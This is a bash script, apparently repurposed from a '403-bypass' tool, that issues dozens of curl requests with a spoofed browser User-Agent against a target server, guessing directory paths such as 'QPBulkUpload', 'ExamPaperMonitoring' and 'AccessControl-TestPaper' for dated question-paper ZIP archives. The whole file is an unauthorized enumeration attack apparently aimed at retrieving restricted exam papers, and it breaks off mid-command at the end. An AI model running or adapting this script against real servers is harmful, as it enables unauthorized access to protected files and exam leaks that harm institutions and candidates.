#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 
echo -n "Payload [QPBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ToolQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ToolQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ToolQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
